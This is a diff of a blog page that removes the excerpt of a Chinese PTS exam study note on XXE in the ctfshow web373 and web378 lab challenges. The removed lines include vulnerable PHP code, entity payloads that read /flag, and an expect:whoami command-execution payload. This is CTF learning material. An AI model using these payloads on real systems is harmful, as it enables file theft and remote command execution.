@@ -279,7 +279,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-05-22 16:39:51" itemprop="dateModified" datetime="2025-05-22T16:39:51+08:00">2025-05-22</time>
+      <time title="Modified: 2025-11-04 17:53:52" itemprop="dateModified" datetime="2025-11-04T17:53:52+08:00">2025-11-04</time>
     </span>
 
   
@@ -293,23 +293,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近要备考PTS，记录一下，就当是笔记了。</p>
-<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p><strong>ctfshow web373</strong></p>
-<p>xxe这个考点之前接触的挺少的，记录一下，这里以ctfshow web入门的xxe为例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any </span><br><span class="line">[&lt;!ENTITY hack SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&lt;ctfshow&gt;&amp;hack;&lt;/ctfshow&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>需要注意的是不能直接hackbar传，因为hackbar只对传输键值对的数据有效。所以就通过bp抓包来传。</p>
-<p><strong>ctfshow web378</strong></p>
-<p>题目给了一个登录框，抓包的时候可以发现<code>Content-Type: application/xml;charset=UTF-8</code> ，然后post实体为:<code>&lt;user&gt;&lt;username&gt;1;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></p>
-<p>所以改下373的payload可以拿来直接用，用bp传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any </span><br><span class="line">[&lt;!ENTITY hack SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在支持expect协议的php环境里面，可以利用expect协议来RCE，以上面为payload为例，改写一下即，注意该协议不支持空格，所以要用$IFS来绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE any </span><br><span class="line">[&lt;!ENTITY hack SYSTEM &quot;expect:whoami&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/05/21/pts%E5%A4%87%E8%80%83/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
